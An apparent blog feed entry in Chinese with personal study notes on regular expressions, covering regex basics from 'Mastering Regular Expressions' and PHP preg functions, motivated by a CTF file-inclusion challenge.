    <content type="html"><![CDATA[<p>起因是最近做一道文件包含的ctf题目时，卡了很久，最后才发现是对正则表达式的理解有问题导致，害，太菜了，最后反思了一下还是没有好好学习正则表达式（尤其是没有系统的进行学习），于是决定系统的学习一下正则表达式。</p><p>本次学习使用的学习资料为《精通正则表达式(第三版)》。内容主要为正则表达式基础和本人比较常遇到PHP环境下的正则表达式。</p><h1 id="正则表达式基础"><a href="#正则表达式基础" class="headerlink" title="正则表达式基础"></a>正则表达式基础</h1><p>正则表达式由两种字符构成，<strong>元字符</strong>和<strong>文字,元字符</strong>为高级应用提供了丰富而且描述力极强。</p><h2 id="行的起始和结束"><a href="#行的起始和结束" class="headerlink" title="行的起始和结束"></a>行的起始和结束</h2><p>^ 表示一行的开始</p><p>$  表示一行的结束</p><p>^aa 匹配以aa开头的行</p><p>^$  行开头接行末尾</p><p>^aa$ 一行内容为aa的行</p><h2 id="字符组"><a href="#字符组" class="headerlink" title="字符组"></a>字符组</h2><p>匹配若干字符之一</p><p><strong>同样的字符在字符组内和组外含义不同</strong></p><h3 id="连字符"><a href="#连字符" class="headerlink" title="连字符"></a>连字符</h3><p>‘-’连字符，表示一个范围(仅在<strong>字符组内部且不在开头</strong>连字符才是元字符）</p><p>例如：</p><p>&lt;H[1-6]&gt;与&lt;H[123456]&gt;是相同的</p><p>多重范围同样的允许的</p><p>例如：</p><p>[0-9A-Za-z]</p><h3 id="排除型字符组"><a href="#排除型字符组" class="headerlink" title="排除型字符组"></a>排除型字符组</h3><p>^表示排除，后面表示不希望匹配的字符</p><p>例如:</p><p>[^1-6] 匹配除了1到6以外的任何字符</p><h2 id="用点号匹配任意字符"><a href="#用点号匹配任意字符" class="headerlink" title="用点号匹配任意字符"></a>用点号匹配任意字符</h2><p>元字符.是用来匹配任意字符的字符组的简便写法，<strong>注意仅在字符组外为元字符</strong></p><p>例如：</p><p>11.11</p><p>可以匹配11-11,11.11,11/11等</p><h2 id="多选结构"><a href="#多选结构" class="headerlink" title="多选结构"></a>多选结构</h2><p>‘|’或，简单易懂就是匹配表达式中的一个表达式</p><p>例如：</p><p>c(a|e)t 即可匹配cat也可以匹配cet</p><p>表达式前加上(?i)可以忽视大小写</p><h2 id="单词分界线"><a href="#单词分界线" class="headerlink" title="单词分界线"></a>单词分界线</h2><p>&lt; 用于匹配单词的开始位置</p><p>&gt; 用于匹配单词的结束位置</p><p>可以想象成单词版本的^和$</p><p>两者可以一起使用用于匹配单词也可以只使用一个用于匹配某个字符串开始或结束的单词</p><p>\b 用于字符串开始或结尾进行匹配</p><p>m/\bjack/ 可匹配jack开头的所有字符串</p><p>m/jack\b/ 可匹配jack结尾的所有字符串</p><p> m/\bjack\b/ 只能匹配jack</p><h2 id="可选项元素"><a href="#可选项元素" class="headerlink" title="可选项元素"></a>可选项元素</h2><p>?表示可选项</p><p>例如</p><p>jkk? 可以匹配jk和jkk</p><p>+表示之前邻接的元素出现<strong>一次或多次</strong></p><p>例如</p><p>jk+ 可以匹配jkkkkkkkk、jk、jkkkk</p><p>*则是匹配任意次数，<strong>包括0次</strong></p><p>jk*  可以匹配j、jk、jkkkkkk</p><p><img src="https://i.loli.net/2021/03/06/OG2C3zYB4nFrDiQ.png" alt="Untitled.png"></p><p><strong>贪婪</strong>：指尽可能的匹配出最长的内容</p><p><strong>非贪婪</strong>：匹配出最短的内容</p><p>而*和+都是贪婪的，它们都会尽可能多的匹配文字。</p><p>只要在它们的后面加上一个？就可以实现非贪婪即最小匹配</p><p>例如：</p><p>&lt;..&gt;head&lt;..&gt;</p><p>/&lt;.*&gt;/    匹配结果为&lt;..&gt;head&lt;..&gt;</p><p>/&lt;.*?&gt;/   匹配结果为&lt;..&gt;</p><p>区间量词</p><p>{min,max}</p><p>上述三个元符号可以等价于以下量词</p><p><img src="https://i.loli.net/2021/03/06/i6GkxBnu3bMXJL9.png" alt="Untitled 1.png"></p><h2 id="括号以及反向引用"><a href="#括号以及反向引用" class="headerlink" title="括号以及反向引用"></a>括号以及反向引用</h2><p>括号除了将若干字符组合为一个单元，还有一个作用就是可以记录它们包含的子表达式匹配的文本。</p><p>\1匹配第一个括号内匹配的内容，\2匹配第二个括号匹配的内容，如此类推</p><p>例如：</p><p>&lt;([A-Za-z]+) +\1&gt; 匹配两个连续重复的单词</p><h2 id="非捕获型括号"><a href="#非捕获型括号" class="headerlink" title="非捕获型括号"></a>非捕获型括号</h2><p>(?:)表示这个括号只进行分组而不捕获，即也不会影响捕获计数，即仅用于分组的括号</p><h2 id="命名捕获"><a href="#命名捕获" class="headerlink" title="命名捕获"></a>命名捕获</h2><p>在python和php中，可以对捕获内容进行命名，语法相同，都是(?P<name>..)</p><p>例如：</p><p>\b(?P<Area>\d\d\d)</p><h2 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h2><p>如果需要匹配的某个字符本身就是元字符，应该如何处理呢？</p><p>例如.本身就是元字符，在我们需要匹配一个网址时，我们可以这样写</p><p>www.baidu.com</p><p>或者匹配一个括号包含字符</p><p>([a-zA-Z]+)</p><h2 id="主要流派的正则表达式的部分简记法"><a href="#主要流派的正则表达式的部分简记法" class="headerlink" title="主要流派的正则表达式的部分简记法"></a>主要流派的正则表达式的部分简记法</h2><p>\s  匹配所有空白字符</p><p>\n  换行符</p><p>\r   回车符</p><p>\t   制表符</p><p>\S  除’\s’外的所有内容</p><p>\w  等价于[a-zA-Z0-9] </p><p>\W 除’\w’外的任何字符</p><p>\d  等价于[0-9]，即数字</p><p>\D  除’\d’外的任何字符</p><p>/i修饰符表示此测试区不区分大小写，注意：虽然写法是’/i’,但其实“i”只是跟在表示结尾的斜线之后</p><p>m/../ 匹配</p><p>s/../../ 匹配并替换</p><h2 id="环视结构"><a href="#环视结构" class="headerlink" title="环视结构"></a>环视结构</h2><h3 id="顺序环视"><a href="#顺序环视" class="headerlink" title="顺序环视"></a>顺序环视</h3><p>用(?=…)来表示</p><p>例如</p><p>(?=\d),表示如果当前位置右边的字符是数字则匹配成功</p><h3 id="逆序环视"><a href="#逆序环视" class="headerlink" title="逆序环视"></a>逆序环视</h3><p>用(?&lt;=….)表示</p><p>例如(?&lt;=\d),表示如果当前位置左边有一位数字则匹配成功（即紧跟在数字后面的位置）</p><p>即逆序的查看（从右向左）文本进行匹配</p><h3 id="否定顺序环视"><a href="#否定顺序环视" class="headerlink" title="否定顺序环视"></a>否定顺序环视</h3><p>(?!……) 不能匹配右侧的文本，即位置右侧不能是指定的文本</p><h3 id="否定逆序环视"><a href="#否定逆序环视" class="headerlink" title="否定逆序环视"></a>否定逆序环视</h3><p>(?&lt;!…)同上，只是改为不能匹配左侧的文本</p><h3 id="环视不会“占用”字符"><a href="#环视不会“占用”字符" class="headerlink" title="环视不会“占用”字符"></a>环视不会“占用”字符</h3><p>理解比较困难，这里直接使用实例</p><p>文本如下</p><p>hello Miss Alice.</p><p>下面用’’包裹匹配的内容来表示匹配的内容</p><p>Miss  匹配 hello ‘Miss’ Alice</p><p>(?=Miss) 匹配 hello ‘’Miss Alice</p><p>即Miss前面的位置，因为符合右边邻接Miss（即在Miss的前面）</p><p>(?=Miss)Mis 匹配hello ‘Mis’s Alice</p><p>(?=Miss)Mis 等价于 Mis(?=s)</p><p>s/../../g 全局替换</p><p>/m 多行查找（导致题目卡住的罪魁祸首~）</p><p>m 主要影响 ^、$。</p><p>若不指定 m，则：^ 只在字符串的最开头，$ 只在字符串的最结尾。即：匹配整个串的开始和结束</p><p>若指定 m，则：^ 在字符串每一行的开头，$ 在字符串每一行的结尾。即：匹配每一行的开始和结束</p><p>注意：在不同流派不同语言中正则表达式的格式存在细微区别</p><h2 id="进制转义"><a href="#进制转义" class="headerlink" title="进制转义"></a>进制转义</h2><h3 id="8进制转义"><a href="#8进制转义" class="headerlink" title="8进制转义"></a>8进制转义</h3><p>\num</p><p>转义为ASCII中数字所代表的字符</p><h3 id="16进制-Unicode转义"><a href="#16进制-Unicode转义" class="headerlink" title="16进制/Unicode转义"></a>16进制/Unicode转义</h3><p>\xnum  \x(num) \unum \Unum</p><h3 id="控制字符"><a href="#控制字符" class="headerlink" title="控制字符"></a>控制字符</h3><p>\cchar用于匹配小于32的控制字符（有些支持匹配更大的值）</p><h3 id="x"><a href="#x" class="headerlink" title="\x"></a>\x</h3><p>同时\x在php中被视为\P{M}|p{M}*的缩略表示，也可以看作点号的扩展</p><p>\x与点号的区别</p><p>1.\x能够匹配结尾的组合字符之外</p><ol start="2"><li><p>\x能够匹配换行符和其他在Unicode行终结符</p></li><li><p>点号通配模式下的点号无论什么情况下都能匹配任何字符，而\x不能匹配以组合字符开头的字符</p></li></ol><p>关于基本字符和组合字符可以自行搜索Unicode体系了解</p><h2 id="Unicode的字符性质"><a href="#Unicode的字符性质" class="headerlink" title="Unicode的字符性质"></a>Unicode的字符性质</h2><p>Unicode不仅仅是一套字符映射规则，同时Unicode标准还定义了每一个字符的性质，例如“这个字符是标记字符（mark），它必须和其他字符一起使用”、“ 这个字符是小写字符”</p><p>等。</p><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>不同的正则表达式系统对于这些属性的支持也不同，但是许多支持Unicode的程序能够通过\p(quality)并支持其中的一部分</p><p>\Pxx则匹配不具有对应属性的字符(等价于[^\p{xx}]</p><p>基本的Unicode属性分类如下</p><p>\p{L}       \p{letter}字母</p><p>\p{M}     \p{Mark}不能单独出现，必须和其他基本字符一起出现（例如：重音符号）的字符</p><p>\p{Z}      \p{Separator}用于表示分隔，但本身不可见的字符</p><p>\p{S}      \p{Symbol}各种图形符号和字母符号</p><p>\p{N}     \p{Number}任何数字</p><p>\p{P}      \p{Punctuation}标点字符</p><p>\p{C}      \p{Other}匹配其他任何字符（很少用于正常字符）</p><p>注意：在部分系统中单字母属性可能不需要花括号(例如：\pL而不是\p{L}</p><p>同时每个属性又包含若干的子属性，子属性还可以以某些实现方式支持的特殊形式实现复合</p><p>例如：\p{L&amp;}等价于[\p{Lu}\p{Ll}\p{Lt}]</p><p>基本子属性如下：</p><p><img src="https://i.loli.net/2021/03/06/6Jg8HAtn7MkKhDo.png" alt="Untitled 2.png"></p><h3 id="字母表"><a href="#字母表" class="headerlink" title="字母表"></a>字母表</h3><p>部分系统能够按照字母表的名字以\p{…}的格式进行匹配，例如\p{Hebrew}匹配希伯来文独有的字符(不包含在其他书写系统中也常见的字符例如逗号）</p><p>部分字母表是基于语言的如泰国语，切罗基语等，</p><p>有的则包含多种语言，如拉丁文，有些语言包甚至包含多种字母表，例如日语的字符就有部分来自汉语、拉丁语等。具体请查看对应的文档。</p><p>注意：字母表只包含独属于（严格来说应该是几乎独属于，例如上文提到的日语），而不是特定书写系统的所有字符。而常见的字符则是通属于叫IsCommon的字符表，使用{IsCommon}来进行匹配。</p><p>扩展：还有一个伪字符表Inherited它包括从其所属的字符表中的基本字符继承而来的组合字符。</p><h3 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h3><p>区块类似但小于字母表（或者说是低配版的字母表)，区块表示Unicode字符映射表中一定范围内的代码点。</p><p>例如Tibetan区块表示的是从U+0F00到U+0FFF的256个代码点。其中的字符可以用\p{InTibetan}来匹配.</p><p>为什么是低配版的字母表的原因如下：</p><p>1.区块可能包含没有赋值的代码点，例如在Tibetan区块中就有25%的代码点没有分配</p><p>2.并不像字母表那样，所有看上去和区块内的字符相关的字符都在区块内的</p><p>3.区块内也常常包含和区块不相干的字符，例如人民币符号￥在Latin_1_Supplement区块</p><p>4.区块是相互交叉的，即某个字母表的字符可能同时被包含于多个区块。例如希腊字母同时出现在Greek和Greek_Extended 区块中</p><p>但是对于区块的支持比字母表更加普遍</p><p>比较常见的系统支持如下：</p><p><img src="https://i.loli.net/2021/03/06/QdeSxN1DKuTAwH6.png" alt="Untitled 3.png"></p><h2 id="字符组运算"><a href="#字符组运算" class="headerlink" title="字符组运算"></a>字符组运算</h2><h3 id="减号（-）"><a href="#减号（-）" class="headerlink" title="减号（-）"></a>减号（-）</h3><p>直接用实例说明</p><p>例如</p><p>[[a-z]-[aeiou]]</p><p>匹配的字符就是[a-z]能够匹配字符的减去[aeiou]能够匹配的字符</p><p>也即除了元音字母以外的字母</p><p>[\p{P}-[\p{Ps}\p{Pe}] ]</p><p>匹配\p{Ps}中除了[\p{Ps}\p{Pe}]外的字符</p><p>即匹配除了{和]之类成对的符号以外的所有标点符号。</p><h3 id="OR"><a href="#OR" class="headerlink" title="OR"></a>OR</h3><p>这个或上文有所提及的‘|“不同这里千万不要弄混了，在字符组中OR更像是一种简记法，用于以字符组的方式来先字符组中添加字符，更多时候用于排除型字符组中。</p><p>例如[abcxyz]等价于[ [abc] [xyz] ]、[ [abc]xyz]等等</p><h3 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h3><p>AND对两个集合进行与运算</p><p>例如[\p{InThai}&amp;&amp;\P{Cn}]</p><p>对\p{InThai}和\P{Cn}进行交运算</p><p>注意第二个P是大写即匹配不具有此属性的字符</p><p>也即\P{Cn}等价于[^\p{Cn}]</p><h3 id="锚点及其他”零长度断言“"><a href="#锚点及其他”零长度断言“" class="headerlink" title="锚点及其他”零长度断言“"></a>锚点及其他”零长度断言“</h3><p>锚点及其他”零长度断言“并不匹配文本内容，而是寻找文本中的位置。</p><p>具体可参考下表</p><p><img src="https://i.loli.net/2021/03/06/B9mAOtjSZw7RMce.png" alt="Untitled 4.png"></p><p>\G 用于匹配起始位置（或者是上一次匹配的结束位置）</p><h2 id="模式修饰符（-modifier"><a href="#模式修饰符（-modifier" class="headerlink" title="模式修饰符（?modifier)"></a>模式修饰符（?modifier)</h2><p>常见的模式修饰符字母</p><p><img src="https://i.loli.net/2021/03/06/sV43tXduPIaOnMS.png" alt="Untitled 5.png"></p><p>作用范围</p><p>(?:(?i)very)可化简为：</p><p>(?i:…..)表示在括号内有效</p><p>注意：python支持第一种即(?i)格式</p><p>但是不支持(?i:…)格式</p><h2 id="注释-…-和-…"><a href="#注释-…-和-…" class="headerlink" title="注释(?#…)和#…"></a>注释(?#…)和#…</h2><p>很少用到和见到，了解一下就ok了</p><h2 id="固化分组-（-gt-…"><a href="#固化分组-（-gt-…" class="headerlink" title="固化分组 （?&gt;…)"></a>固化分组 （?&gt;…)</h2><p>一旦括号内的子表达式匹配之后，匹配的内容就固定下来无法修改，并且在接下来的匹配过程中不会变化，除非整个固化分组的括号都被弃用。</p><p>例如：</p><p>文本为hello!</p><p>.*!是可以进行匹配的</p><p>而(?&gt;.*)! 是无法被匹配的</p><p>因为在固化分组中hello!已经被.*所匹配且无法再被改变，所以没有!来匹配后面的那个!了</p><h2 id="文字文本范围：-Q…-E"><a href="#文字文本范围：-Q…-E" class="headerlink" title="文字文本范围：\Q…\E"></a>文字文本范围：\Q…\E</h2><p>消除\E以外所有元字符的特殊含义，如果没有\E则一直作用到正则表达式末端。</p><p>即在\Q到\E的范围内，所有字符都被当做文本，元字符也不需要在前面加上\来说明用作字符了</p><h2 id="忽略优先量词：-num-num"><a href="#忽略优先量词：-num-num" class="headerlink" title="忽略优先量词：*? , +? , ?? , {num,num}?"></a>忽略优先量词：*? , +? , ?? , {num,num}?</h2><p>如果不确定是否要匹配，忽略优先量词会选择”不匹配”的状态，再尝试表达式中之后的元素，如果尝试失败，再回溯，选择之前保存的”匹配”的状态。</p><p>对[\s\S]<em>来说</em>，把*<em>改为</em>?就是使用了忽略优先量词，*?限定的元素出现次数范围与*完全一样，都表示”可能出现，也可能不出现，出现次数没有上限”。区别在于，在实际匹配过程中，遇到[\s\S]能匹配的字符，先尝试”忽略”，如果后面的元素不能匹配，再尝试”匹配”，就如名字一样优先忽略出现的匹配结果</p><p>注意忽略优先量词和匹配优先量词本身在匹配次数上是没有区别的，例如<em>和</em>？的区间还都是[0,∞]，<strong>区别在于，忽略优先量词会优先选择”忽略”，而匹配优先量词会优先选择”匹配”。</strong></p><h2 id="占有优先量词：-num-num"><a href="#占有优先量词：-num-num" class="headerlink" title="占有优先量词：*+ , ++ , ?+ , (num,num)+"></a>占有优先量词：*+ , ++ , ?+ , (num,num)+</h2><p>占有优先量词类似于普通的匹配优先量词，不过他们一旦匹配某些内容就不会”交还“，类似于固化分组</p><h1 id="PHP环境下的正则"><a href="#PHP环境下的正则" class="headerlink" title="PHP环境下的正则"></a>PHP环境下的正则</h1><p>下面主要讨论的是preg引擎下提供的函数</p><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><p>preg引擎的一些说明</p><p>1.\b在字符组内部才表示退格符，在其他场合\b表示单词分界符</p><p>\0匹配空字节</p><p>2.单词分界符和字符简记法，例如\w,\s只对ASCII字符起作用（即使是在UTF-8模式下），如果要处理Unicode字符，可以用\pL代替\w,</p><p>\pN代替\d, \pZ代替\s</p><p>3.在PHP里，Unicode的字母表不需要类似于’Is’或者’ In’这样的前缀，而且属性不支持长名称，例如只能写作\pL，不支持\p{Letter}</p><p>PHP支持<strong>\p{L&amp;}</strong>(等价于[\p{Lu}\p{Ll}\p{Lt}])<strong>和\p{Any}</strong>(表示任意字符）</p><p>4.默认情况下preg的正则表达式是以字节为单位的，所以\C等价于(?s:.),不过如果使用了修饰符u,preg就会自动变为以UTF-8字母为单位，即一个字符最多可能6个字节组成。但是\C仍匹配单个字节</p><p>5.\z和\Z都可以匹配字符串的末尾，\Z同样能够匹配最好的换行符</p><p>而$(匹配行末）的意义则会随着模式修饰符变化（m和D），</p><p>在没有设定任何修饰符时$等价于\Z</p><p>如果使用了m，则它可以匹配内嵌的换行符（那道题的解题关键）</p><p>如果使用了模式修饰符D，它能够匹配\z（只有在字符串的结尾）</p><p>如果同时设置了m和D则视为m</p><p>6.逆序环视结构使用的子表达式只能匹配固定长度的文本，除非顶层多选分支容许不同的固定长度</p><p>7.模式修饰符x（自由格式和注释）只能识别ASCII的空白字符，不能识别Unicode中的空白字符。</p><h2 id="分隔符"><a href="#分隔符" class="headerlink" title="分隔符"></a>分隔符</h2><p>preg要求正则表达式两侧必须要有分隔符，常见的做法是把斜线作为分隔符（注意我们可以使用除字母、数字、反斜线和空白字符外的任意ASCII字符做风格符），常见的是一对斜线，也有使用!和#作为分隔符的</p><h2 id="PHP特有的修饰符"><a href="#PHP特有的修饰符" class="headerlink" title="PHP特有的修饰符"></a>PHP特有的修饰符</h2><p>除四种标准修饰符里的模式修饰符外(i、s、m、x)</p><p>修饰符e只用于preg_replace,具体可以看函数preg_replace部分</p><h3 id="模式修饰符u"><a href="#模式修饰符u" class="headerlink" title="模式修饰符u"></a>模式修饰符u</h3><p>以utf-8编码处理正则表达式和目标字符串，此模式不会修改数据，只是更改处理数据的方式，在utf-8编码中，非ASCII字符以多个字节来储存，使用u修饰符能够确保多个字节会作为单个字符来处理。</p><h3 id="模式修饰符X"><a href="#模式修饰符X" class="headerlink" title="模式修饰符X"></a>模式修饰符X</h3><p>启动PCRE的额外功能，目前它只有一个效果，如果出现了无法识别的反斜线，就报告错误。例如，默认情况下，\k在PCRE中没有特殊意义，正常情况下会被看作k，如果使用了模式修饰符X，就会报告’unrecognized character follows  &quot;</p><h3 id="模式修饰符S"><a href="#模式修饰符S" class="headerlink" title="模式修饰符S"></a>模式修饰符S</h3><p>调用PCRE的研究(study)特性，预先分析正则表达式，在某些顺利情况下，在尝试匹配时速度会大大提升。</p><h3 id="不常用的模式修饰符"><a href="#不常用的模式修饰符" class="headerlink" title="不常用的模式修饰符"></a>不常用的模式修饰符</h3><p>模式修饰符A 把匹配锚定再第一次尝试的位置，就等于整个正则表达式以\G开头</p><p>模式修饰符D 会把每个$替换成\z，即$匹配字符串的末尾，而不是字符串之内的换行符</p><p>模式修饰符U交换元字符的匹配优先含义：<em>和</em>?交换，（完全不知道这个是拿来干什么的，感觉一点用都没有）</p><h2 id="Preg函数"><a href="#Preg函数" class="headerlink" title="Preg函数"></a>Preg函数</h2><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h3><p>preg_match(pattern,subject[,matches[,flags[,offset]]])</p><p>测试正则表达式能否在字符串中找到匹配，并提取数据</p><p><strong>参数</strong></p><p>pattern 分隔符包围起来的正则表达式，可能有修饰符</p><p>subjuct 需要进行搜索的目标字符串</p><p>matches 非必要，用来接受匹配数据</p><p>flags 非必要，此标志位会影响整个函数的行为，这里只容许出现一个标志位</p><p>offset 非必要，从0开始，表示开始匹配的位置</p><p><strong>返回值</strong></p><p>成功匹配返回true否则返回false</p><h3 id="preg-match-all"><a href="#preg-match-all" class="headerlink" title="preg_match_all"></a>preg_match_all</h3><p>preg_match_all(pattern,subject,matches[,flags[,offset]])</p><p>在字符串中提取数据</p><p><strong>参数</strong></p><p>pattern 分隔符包围起来的正则表达式，可能有修饰符</p><p>subjuct 需要进行搜索的目标字符串</p><p>matches 必要，用来接受匹配数据（和preg_match不同的地方）</p><p>flags 非必要，此标志位会影响整个函数的行为，这里只容许出现一个标志位</p><p>offset 非必要，从0开始，表示开始匹配的位置</p><p><strong>返回值</strong></p><p>preg_match_all返回匹配的次数</p><p>preg_match_all可以以两种方式在$all_matches中存放数据，由参数flag决定</p><p>flag:PREG_PATTERN_ORDER或是PREG_SET_ORDER来决定</p><p>默认的排列方式是PREG_PATTERN_ORDER</p><p>下面是书中的例子</p><p><img src="https://i.loli.net/2021/03/06/F3LmndhNDg4U1BZ.png" alt="Untitled 6.png"></p><p>而如果使用PREG_SET_ORDER则会返回下面这个数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span></span><br><span class="line">(</span><br><span class="line"><span class="number">0</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span> =&gt; <span class="keyword">array</span>( <span class="number">0</span> =&gt; <span class="string">&quot;Jack A. Smith&quot;</span>,</span><br><span class="line"><span class="number">1</span> =&gt; <span class="string">&quot;Jack&quot;</span>,</span><br><span class="line"><span class="number">2</span> =&gt; <span class="string">&quot;A.&quot;</span>,</span><br><span class="line"><span class="number">3</span> =&gt; <span class="string">&quot;Smith&quot;</span>,</span><br><span class="line">)</span><br><span class="line"><span class="number">1</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span> =&gt; <span class="string">&quot;Mary B. Miller&quot;</span>,</span><br><span class="line"><span class="number">1</span> =&gt; <span class="string">&quot;Mary&quot;</span>,</span><br><span class="line"><span class="number">2</span> =&gt; <span class="string">&quot;B.&quot;</span>,</span><br><span class="line"><span class="number">3</span> =&gt; <span class="string">&quot;Miller&quot;</span></span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><p>preg_replace(pattern,replacement,subject[,limit[,count]]}</p><p>在字符串的副本中替换匹配的文本</p><p><strong>参数</strong></p><p>pattern 分隔符包围起来的正则表达式，可能有修饰符</p><p>replacement replacement字符串，如果pattern是一个数组，则replacement是包含多个子符 串的数组，如果使用了模式修饰符e，则字符串会被当作php代码</p><p>subjuct 需要进行替换的目标字符串，也可以是数组</p><p>limit 非必要，是一个整数，表示替换发生的上限</p><p>count 非必要，用来保存实际进行的替换次数（只有php5提供）</p><p><strong>返回值</strong></p><p>当subject是单个字符时，则返回一个字符串（subject可能被修改后的副本）</p><p>当subject是数组时则返回数组</p><p>Pattern和replacement可以以(字符串、字符串) (数组，字符串) (字符串，数组)</p><p>如果使用了模式修饰符e，replacement字符串的捕获引用会按照特殊的规定来插值：插值中的引号（单引号和双引号）会转义。如果不这样处理，插入的数值中的引号会让PHP代码出错。</p><h3 id="preg-replace-callback"><a href="#preg-replace-callback" class="headerlink" title="preg_replace_callback"></a>preg_replace_callback</h3><p>preg_replace_callback(pattern,callback,subject[,limit[,count]])</p><p>对字符串中的每处匹配文本调用处理函数</p><p><strong>参数</strong></p><p>pattern 分隔符包围起来的正则表达式，可能有修饰符</p><p>callback PHP回调函数，每次匹配成功，就执行它，生成replacement字符串</p><p>subjuct 需要进行替换的目标字符串，也可以是数组</p><p>limit 非必要，是一个整数，表示替换发生的上限</p><p>count 非必要，用来保存实际进行的替换次数（只有php5提供）</p><p><strong>返回值</strong></p><p>当subject是单个字符时，则返回一个字符串（subject可能被修改后的副本）</p><p>当subject是数组时则返回数组</p><h3 id="preg-split"><a href="#preg-split" class="headerlink" title="preg_split"></a>preg_split</h3><p>preg_split(pattern,subject[,limit,[flags]])</p><p>将字符串切分为子串数组</p><p><strong>参数</strong></p><p>pattern 分隔符包围起来的正则表达式，可能有修饰符</p><p>subjuct 需要进行分割的目标字符串</p><p>limit 非必要，是一个整数，表示切分之后元素的上限</p><p>flags 非必要，此标志位会影响整个函数的行为，以下三种可以随意组合</p><p>PREG_SPLIT_NO_EMPLY</p><p>PREG_SPLIT_DELIM_CAPTURE</p><p>PREG_SPLIT_OFFSET_CAPTURE</p><p><strong>返回值</strong></p><p>返回一个字符串数组</p><p><strong>flag参数</strong></p><p>三个标志位都会影响函数的功能，它们可以单独使用，也可以用or连接</p><p>PREG_SPLIT_OFFSET_CAPTURE</p><p>类似于preg_match_all中的PREG_OFFSET_CAPTURE，这个标志位会修改结果数组，把每个元素变为包含两个元素的数组</p><p>PREG_SPLIT_NO_EMPLY</p><p>这个标志位设定后preg_split会忽略空字符串，不把它们放在返回数组中，也不计入limit的统计中。</p><p>PREG_SPLIT_DELIM_CAPTURE</p><p>这个标志位在结果中包含匹配的文本，以及进行此次切分的正则表达式的捕获括号匹配的文本，下面用例子说明</p><p>字符串如下，而且是用or和and来连接的</p><p>DLSR camera and Nikon D200 or Canon EOS 30D</p><p>在不使用PREG_SPLIT_DELIM_CAPTURE的情况下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = preg_split(<span class="string">&#x27;/\s+ (and|or) \s+ /x&#x27;</span>,<span class="variable">$input</span>);</span><br></pre></td></tr></table></figure><p>结果是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="string">&quot;DLSR camera&#x27;,&#x27;Nikon D200&#x27;,&#x27;Canon EOS 30D&#x27;)</span></span><br></pre></td></tr></table></figure><p>分隔符内容被去掉了，但是如果使用了PREG_SPLIT_DELIM_CAPTURE呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = preg_split(<span class="string">&#x27;/\s+ (and|or) \s+ /x&#x27;</span>,<span class="variable">$input</span>,<span class="number">-1</span>,PREG_SPLIT_DELIM_CAPTURE);</span><br></pre></td></tr></table></figure><p>结果如下，即分隔符也被包括进去了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;DLSR camera&#x27;</span>,<span class="string">&#x27;and&#x27;</span>,<span class="string">&#x27;Nikon D200&#x27;</span>,<span class="string">&#x27;or&#x27;</span>,<span class="string">&#x27;Canon EOS 30D&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="prep-grep"><a href="#prep-grep" class="headerlink" title="prep_grep"></a>prep_grep</h3><p>preg_grep(pattern,input[,flags])</p><p>选出数组中能（不能）由表达式匹配的元素</p><p><strong>参数</strong></p><p>pattern 分隔符包围起来的正则表达式，可能有修饰符</p><p>input 一个数组，如果它们的值能够匹配pattern，则其值会复制到返回的数组中。</p><p>flags 非必要，此标志位PREG_GREF_INVERT或者是0</p><p><strong>返回值</strong></p><p>一个数组，包含input中能够由pattern匹配的元素(如果使用了PREG_GREF_INVERT标志位，则包括不能匹配的元素)</p><h3 id="preg-quote"><a href="#preg-quote" class="headerlink" title="preg_quote"></a>preg_quote</h3><p>preg_quote(input[,delimiter])</p><p>转义字符串中的正则表达式元字符</p><p><strong>参数</strong></p><p>input 希望以文字方式用作pattern参数的字符串</p><p>delimiter 非强制出现的参数，包含1个字符的字符串，表示希望用在pattern参数的分隔符</p><p><strong>返回值</strong></p><p>preg_quote返回一个字符串，它是input的副本，其中的正则表达式元字符进行了转义，如果指定了分隔符，则分隔符本身也会被转义。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;起因是最近做一道文件包含的ctf题目时，卡了很久，最后才发现是对正则表达式的理解有问题导致，害，太菜了，最后反思了一下还是没有好好学习正则表达式（尤其是没有系统的进行学习），于是决定系统的学习一下正则表达式。&lt;/p&gt;
&lt;p&gt;本次学习使用的学习资料为《精通正则表达式(第三版)</summary>
      
    
    
    
    <category term="基础学习" scheme="http://fxizenta.github.io/categories/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="正则表达式" scheme="http://fxizenta.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>一道flask的wp</title>
    <link href="http://fxizenta.github.io/2021/03/01/awp_for_falsk/"/>
    <id>http://fxizenta.github.io/2021/03/01/awp_for_falsk/</id>
    <published>2021-03-01T08:24:46.000Z</published>
    <updated>2021-03-03T05:01:24.547Z</updated>
    
